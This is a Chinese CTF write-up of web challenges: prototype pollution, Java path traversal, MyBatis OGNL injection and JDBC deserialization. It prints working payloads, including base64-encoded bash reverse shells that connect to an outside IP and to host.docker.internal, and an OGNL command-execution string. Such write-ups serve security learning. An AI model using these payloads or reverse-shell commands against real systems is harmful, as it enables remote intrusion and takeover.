# web
### ez_sandbox
#原型链污染 

过滤了 `__proto__`
`constructor.prototype`绕过

先注册一个用户
,在登录时污染admins对象
```json
{"username":"leijk","password":"leijk","constructor":{"prototype":{"leijk":"123"}}}
```

---
vm沙箱不会绕


### auth_bypass
#java
给了源码,审计发现存在任意文件读取,前缀的download使用双斜杠绕过
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231022211027.png)
读取配置文件web.xml
得到evil路径并读取evilServlet的class源码 `../WEB-INF/classes/com/example/demo/EvilServlet.class`
反编译打开,存在恶意命令执行
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231022211317.png)

Runtime.exec()单参数命令执行需要修改以下反弹shell的形式
https://blog.spoock.com/2018/11/25/getshell-bypass-exec/

需要urlencode以下字符串
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4yNTUuMTY2LjEyLzgyIDA+JjE=}|{base64,-d}|{bash,-i}
```

### mybaits
mybaits2.2存在ongl表达式注入漏洞
#ongl 
```java
${@java.lang.Runtime@getRuntime().exec("calc")}
//反弹shell需要{},使用base64编码
${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzgxTkM0eU5UVXVNVFkyTGpFeUx6Z3lJREErSmpFPX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9')))}
```

### testConnection
会进行一个数据库的test连接,存在jdbc反序列化漏洞

远程`java -jar fake*.jar`开启一个fake server 可以-p指定端口

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231106172857.png)

jdbc命令
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231106173305.png)

```url
/testConnection?
driver=com.mysql.cj.jdbc.Driver&url=jdbc:mysql://host.docker.internal:3308/test?
autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-
d}|{bash,-i}&password=123
```

# reverse


# pwn

# crypto

# Misc


---
# *相关wp*




2023-10-21   13:22